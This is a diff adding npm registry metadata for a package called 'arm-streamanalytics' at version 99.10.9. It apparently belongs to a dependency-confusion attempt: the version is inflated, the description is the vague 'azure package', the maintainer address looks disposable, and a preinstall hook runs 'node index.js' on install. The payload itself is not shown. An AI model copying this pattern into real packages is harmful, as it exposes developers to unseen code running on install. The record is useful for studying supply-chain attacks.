@@ -1,0 +1,62 @@
+{
+    "_id": "arm-streamanalytics",
+    "name": "arm-streamanalytics",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-streamanalytics",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-streamanalytics@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-spE+jUHq4x/NlO70SC/FxMWxqUr/ajS4k4W8TwIolNekzWPMvMDASbqgq2VD75zIFEK9FbqASwC+gT2yANSO3g==",
+                "shasum": "36be7a2393bcfb8b2e5d782b7c8b0149d484888f",
+                "tarball": "https://registry.npmjs.org/arm-streamanalytics/-/arm-streamanalytics-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5068,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNac2ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrJow//SV2IJkfYmyHe/RItgpU9KrdqOyWAwC+GhCDuhIW9CvEvS3H/\r\nyskqIxMt087vQUCLc8bIxCyrbo5bQOdvewL8gwRDbAWIEgdb/fDkmxC+w5hu\r\njGisdVL78pM0e7bH93c5Bt8wqH/7PM6Vdnptqm630v/PTURn756kQMz/1Cd+\r\nBLWN9x14iYWf0oSHQHh0eWIfHUtzoPuN8bl1d4vKVh4FbMhvZ33BrLLuaNCY\r\nocU21ujg5+Bak1JDGDlXN7I/YdZ8VSfXV20n3L+6Le3ruxFS39vyEjOVms2i\r\ngcjGfDM3UVU2bQ3IA/jHAu6RUTx3kzZWJLJiShuqqZ+qFrjkwp1RXRlpsH/Q\r\nKv3ricmSDFhE8ZZbIpAofNOssN5XABplXTab2iZ6sqJm+bUv9pDx6WYqkoPI\r\nckeR9Hyx/FbnXgInkFlLUrshdMEOV9/2C7EC3IYPdeiEVhgiQha8/1iDZ7hb\r\nDNDFwW5jc3N5StGSAT/n9C8c5G3KRua1CDwopA2Dcl2uLWew25TUlTXe7Vn7\r\nuQkdGDF6UT/VrMV8j3MLElol8mYRCRNNR3z7Qv5D/GoZt+O84xYc/jQ9CzLW\r\nH0lsfifgq53kmvTMifOCm7AnAmS/ySuQNan5pv6r2kgmMRT9xfjL734Yq0ZD\r\nq8LrI7xsljsBTta+3ToRTHcNpb7l5nvfSVY=\r\n=Ia8j\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "y3561w70",
+                "email": "y3561w70@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "y3561w70",
+                    "email": "y3561w70@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-streamanalytics_99.10.9_1647683382209_0.62366065652612"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T09:49:42.208Z",
+        "99.10.9": "2022-03-19T09:49:42.418Z",
+        "modified": "2022-03-19T09:49:42.522Z"
+    },
+    "maintainers": [
+        {
+            "name": "y3561w70",
+            "email": "y3561w70@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
